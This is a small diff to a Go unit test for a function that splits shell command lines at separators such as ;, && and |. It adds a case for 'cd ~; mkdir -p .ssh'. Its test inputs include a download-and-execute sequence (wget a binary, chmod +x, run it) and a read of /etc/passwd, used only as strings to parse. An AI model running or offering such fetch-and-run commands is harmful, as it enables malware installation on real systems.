@@ -15,6 +15,7 @@ func TestSplitLine(t *testing.T) {
 			[]string{"cd /tmp", "wget http://a/x", "chmod +x x", "./x"}},
 		{"cd /tmp || cd /var/run", []string{"cd /tmp", "cd /var/run"}},
 		{"true && echo ok", []string{"true", "echo ok"}},
+		{"cd ~; mkdir -p .ssh", []string{"cd ~", "mkdir -p .ssh"}},
 		{"cat /etc/passwd | grep root | wc -l",
 			[]string{"cat /etc/passwd", "grep root", "wc -l"}},
 		{"", nil},
